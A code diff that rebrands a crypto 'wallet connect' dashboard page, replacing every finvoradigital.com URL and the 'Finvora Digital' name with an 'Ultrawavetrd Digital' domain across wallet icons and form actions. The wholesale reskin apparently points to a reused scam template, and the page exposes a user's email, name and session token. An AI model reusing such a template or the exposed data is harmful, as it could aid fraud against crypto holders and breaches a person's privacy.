@@ -147,7 +147,7 @@
                                         :class="selectedWallet === 'MetaMask' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                         class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                         >
-                                        <img src="https://account.finvoradigital.com/temp/wallet/metamask.webp" alt="MetaMask" class="w-10 h-10 rounded-lg object-contain">
+                                        <img src="https://account.Ultrawavetrddigital.com/temp/wallet/metamask.webp" alt="MetaMask" class="w-10 h-10 rounded-lg object-contain">
                                         <span class="text-xs font-medium text-content-primary">MetaMask</span>
                                                                             </button>
                                                                                                         <button type="button"
@@ -155,7 +155,7 @@
                                         :class="selectedWallet === 'Trust Wallet' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                         class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                         >
-                                        <img src="https://account.finvoradigital.com/temp/wallet/trust-wallet.webp" alt="Trust Wallet" class="w-10 h-10 rounded-lg object-contain">
+                                        <img src="https://account.Ultrawavetrddigital.com/temp/wallet/trust-wallet.webp" alt="Trust Wallet" class="w-10 h-10 rounded-lg object-contain">
                                         <span class="text-xs font-medium text-content-primary">Trust Wallet</span>
                                                                             </button>
                                                                                                         <button type="button"
@@ -163,7 +163,7 @@
                                         :class="selectedWallet === 'Coinbase Wallet' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                         class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                         >
-                                        <img src="https://account.finvoradigital.com/temp/wallet/coinbase-wallet.webp" alt="Coinbase Wallet" class="w-10 h-10 rounded-lg object-contain">
+                                        <img src="https://account.Ultrawavetrddigital.com/temp/wallet/coinbase-wallet.webp" alt="Coinbase Wallet" class="w-10 h-10 rounded-lg object-contain">
                                         <span class="text-xs font-medium text-content-primary">Coinbase Wallet</span>
                                                                             </button>
                                                                                                         <button type="button"
@@ -171,7 +171,7 @@
                                         :class="selectedWallet === 'Phantom' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                         class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                         >
-                                        <img src="https://account.finvoradigital.com/temp/wallet/phantom.webp" alt="Phantom" class="w-10 h-10 rounded-lg object-contain">
+                                        <img src="https://account.Ultrawavetrddigital.com/temp/wallet/phantom.webp" alt="Phantom" class="w-10 h-10 rounded-lg object-contain">
                                         <span class="text-xs font-medium text-content-primary">Phantom</span>
                                                                             </button>
                                                                                                         <button type="button"
@@ -179,7 +179,7 @@
                                         :class="selectedWallet === 'Exodus' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                         class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                         >
-                                        <img src="https://account.finvoradigital.com/temp/wallet/exodus.svg" alt="Exodus" class="w-10 h-10 rounded-lg object-contain">
+                                        <img src="https://account.Ultrawavetrddigital.com/temp/wallet/exodus.svg" alt="Exodus" class="w-10 h-10 rounded-lg object-contain">
                                         <span class="text-xs font-medium text-content-primary">Exodus</span>
                                                                             </button>
                                                                                                         <button type="button"
@@ -187,7 +187,7 @@
                                         :class="selectedWallet === 'Ledger' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                         class="relative flex flex-col items-center gap-2.5 p-4 rounded-xl border-2 transition-all duration-200"
                                         >
-                                        <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Ledger" class="w-10 h-10 rounded-lg object-contain">
+                                        <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Ledger" class="w-10 h-10 rounded-lg object-contain">
                                         <span class="text-xs font-medium text-content-primary">Ledger</span>
                                                                             </button>
                                                             </div>
@@ -210,7 +210,7 @@
                                             :class="selectedWallet === 'OKX' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/okx.webp" alt="OKX" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/okx.webp" alt="OKX" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">OKX</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -218,7 +218,7 @@
                                             :class="selectedWallet === 'Binance' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/binance.jpg" alt="Binance" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/binance.jpg" alt="Binance" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Binance</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -226,7 +226,7 @@
                                             :class="selectedWallet === 'Rabby' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/rabby.webp" alt="Rabby" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/rabby.webp" alt="Rabby" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Rabby</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -234,7 +234,7 @@
                                             :class="selectedWallet === 'Tangem' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/tangem.svg" alt="Tangem" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/tangem.svg" alt="Tangem" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Tangem</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -242,7 +242,7 @@
                                             :class="selectedWallet === 'Arculus' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/arculus.svg" alt="Arculus" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/arculus.svg" alt="Arculus" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Arculus</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -250,7 +250,7 @@
                                             :class="selectedWallet === 'Namo' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/namo.webp" alt="Namo" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/namo.webp" alt="Namo" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Namo</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -258,7 +258,7 @@
                                             :class="selectedWallet === 'DCent' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/dcent.svg" alt="DCent" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/dcent.svg" alt="DCent" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">DCent</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -266,7 +266,7 @@
                                             :class="selectedWallet === 'Trezor' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Trezor" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Trezor" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Trezor</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -274,7 +274,7 @@
                                             :class="selectedWallet === 'Atomic Wallet' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/atomic.png" alt="Atomic Wallet" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/atomic.png" alt="Atomic Wallet" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Atomic Wallet</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -282,7 +282,7 @@
                                             :class="selectedWallet === 'Rainbow' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Rainbow" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Rainbow" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Rainbow</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -290,7 +290,7 @@
                                             :class="selectedWallet === 'Argent' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Argent" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Argent" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Argent</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -298,7 +298,7 @@
                                             :class="selectedWallet === 'KeepKey' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="KeepKey" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="KeepKey" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">KeepKey</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -306,7 +306,7 @@
                                             :class="selectedWallet === 'Guarda' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Guarda" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Guarda" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Guarda</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -314,7 +314,7 @@
                                             :class="selectedWallet === 'Coinomi' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Coinomi" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Coinomi" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Coinomi</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -322,7 +322,7 @@
                                             :class="selectedWallet === 'Electrum' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Electrum" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Electrum" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Electrum</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -330,7 +330,7 @@
                                             :class="selectedWallet === 'Mycelium' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Mycelium" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Mycelium" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Mycelium</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -338,7 +338,7 @@
                                             :class="selectedWallet === 'Zerion' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Zerion" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Zerion" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Zerion</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -346,7 +346,7 @@
                                             :class="selectedWallet === 'Edge' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Edge" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Edge" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Edge</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -354,7 +354,7 @@
                                             :class="selectedWallet === '1inch' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="1inch" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="1inch" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">1inch</span>
                                                                                     </button>
                                                                                                                     <button type="button"
@@ -362,7 +362,7 @@
                                             :class="selectedWallet === 'Bitcoin Wallet' ? 'border-primary bg-primary-subtle' : 'border-surface-border hover:border-surface-border-light'"
                                             class="relative flex flex-col items-center gap-2 p-3 rounded-lg border transition-all duration-200"
                                             >
-                                            <img src="https://account.finvoradigital.com/temp/wallet/other.png" alt="Bitcoin Wallet" class="w-8 h-8 rounded-md object-contain">
+                                            <img src="https://account.Ultrawavetrddigital.com/temp/wallet/other.png" alt="Bitcoin Wallet" class="w-8 h-8 rounded-md object-contain">
                                             <span class="text-[11px] font-medium text-content-secondary truncate w-full text-center">Bitcoin Wallet</span>
                                                                                     </button>
                                                                     </div>
@@ -370,7 +370,7 @@
                         </div>
 
                         
-                        <form method="POST" action="https://account.finvoradigital.com/dashboard/wallectConnect" @submit="handleSubmit($event)">
+                        <form method="POST" action="https://account.Ultrawavetrddigital.com/dashboard/wallectConnect" @submit="handleSubmit($event)">
                             <input type="hidden" name="_token" value="Ma4mCMUlEPD2ywAIhFnOdMNH2gS5D62MRHIVTCY7">                            <input type="hidden" name="wallet" :value="selectedWallet">
 
                             <div x-show="selectedWallet" x-transition x-cloak class="space-y-4">
@@ -558,7 +558,7 @@
             <div class="bg-surface-raised border border-surface-border rounded-xl p-5">
                 <h3 class="text-sm font-semibold text-content-primary mb-2">Need Help?</h3>
                 <p class="text-xs text-content-tertiary mb-3">If you're having trouble connecting or your wallet isn't listed, our support team can assist.</p>
-                <a href="https://account.finvoradigital.com/dashboard/support"
+                <a href="https://account.Ultrawavetrddigital.com/dashboard/support"
                    class="inline-flex items-center gap-1.5 text-xs font-medium text-primary hover:text-primary-light transition-colors">
                     Contact Support
                     <svg class="w-3.5 h-3.5" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
@@ -694,7 +694,7 @@ function walletConnect() {
         
         <footer class="border-t border-surface-border py-6 px-6 mt-8">
             <p class="text-sm text-content-tertiary text-center">
-                &copy; Finvora Digital.
+                &copy; Ultrawavetrd Digital.
             </p>
         </footer>
     </main>
@@ -716,7 +716,7 @@ function walletConnect() {
 </svg>
 </button>
                 </div>
-                <form method="POST" action="https://account.finvoradigital.com/otherpayment" class="space-y-4">
+                <form method="POST" action="https://account.Ultrawavetrddigital.com/otherpayment" class="space-y-4">
                     <input type="hidden" name="_token" value="Ma4mCMUlEPD2ywAIhFnOdMNH2gS5D62MRHIVTCY7">                    <div>
                         <label class="text-xs text-content-tertiary font-medium mb-1 block">Full Name</label>
                         <input type="text" name="name" value="egod" readonly
@@ -770,8 +770,8 @@ function walletConnect() {
 </svg>
 </button>
                 </div>
-                <form method="POST" action="https://account.finvoradigital.com/sendcontact" class="space-y-4">
-                    <input type="hidden" name="_token" value="Ma4mCMUlEPD2ywAIhFnOdMNH2gS5D62MRHIVTCY7">                    <input type="hidden" name="to_email" value="Finvora Digital Support">
+                <form method="POST" action="https://account.Ultrawavetrddigital.com/sendcontact" class="space-y-4">
+                    <input type="hidden" name="_token" value="Ma4mCMUlEPD2ywAIhFnOdMNH2gS5D62MRHIVTCY7">                    <input type="hidden" name="to_email" value="Ultrawavetrd Digital Support">
                     <input type="hidden" name="email" value="egod1422@gmail.com">
                     <input type="hidden" name="name" value="egod">
                     <div>
